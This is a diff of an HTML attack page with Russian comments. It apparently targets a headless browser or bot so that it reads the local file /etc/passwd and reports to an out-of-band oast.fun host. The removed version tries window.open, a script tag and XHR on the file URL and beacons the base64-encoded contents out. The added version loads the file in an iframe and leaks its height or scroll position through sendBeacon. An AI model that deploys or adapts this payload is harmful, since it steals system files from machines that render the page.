@@ -1,47 +1,29 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <div id="status">Testing...</div>
+    <div id="container" style="width: 1px; word-wrap: break-word;">
+        <iframe id="victim" src="file:///etc/passwd" style="width: 100%; height: 10px;"></iframe>
+    </div>
+
     <script>
-        (async function() {
-            const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+        const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+        
+        window.onload = () => {
+            const ifr = document.getElementById('victim');
             
-            // 1. Сразу шлем сигнал, что JS ОЖИЛ
-            navigator.sendBeacon(hook + "/JS_ALIVE");
-
-            // 2. Метод чтения через попытку открытия нового окна
-            try {
-                let win = window.open("file:///etc/passwd");
-                setTimeout(() => {
-                    try {
-                        // Если SOP не сработал (редкость, но бывает в ботах)
-                        let data = win.document.documentElement.innerText;
-                        navigator.sendBeacon(hook + "/DATA_LEAK", btoa(data));
-                    } catch(e) {
-                        navigator.sendBeacon(hook + "/WINDOW_LOCKED", e.message);
-                    }
-                }, 1000);
-            } catch(e) {}
-
-            // 3. Brute-force первой строки (Syntax Error)
-            // Мы ловим ошибку парсинга через глобальный обработчик
-            window.onerror = function(msg, url, line) {
-                navigator.sendBeacon(hook + "/ERROR_LEAK", JSON.stringify({m: msg, u: url}));
-            };
-
-            const script = document.createElement('script');
-            script.src = "file:///etc/passwd"; 
-            document.body.appendChild(script);
-
-            // 4. Попытка через XHR (вдруг флаг --disable-web-security включен?)
-            try {
-                let xhr = new XMLHttpRequest();
-                xhr.open("GET", "file:///etc/passwd");
-                xhr.onload = () => navigator.sendBeacon(hook + "/XHR_LEAK", btoa(xhr.responseText));
-                xhr.send();
-            } catch(e) {}
-
-        })();
+            setTimeout(() => {
+                try {
+                    // Мы не можем прочитать текст, но можем попробовать прочитать ВЫСОТУ
+                    // Если высота > 10px, значит там есть контент!
+                    const height = ifr.contentWindow.document.body.scrollHeight;
+                    navigator.sendBeacon(hook + "/HEIGHT_LEAK", "Lines_Height: " + height);
+                } catch(e) {
+                    // Если SOP блокирует высоту, пробуем метод "Scroll"
+                    const scrollPos = ifr.contentWindow.pageYOffset;
+                    navigator.sendBeacon(hook + "/SCROLL_LEAK", "Pos: " + scrollPos);
+                }
+            }, 1000);
+        };
     </script>
 </body>
 </html>
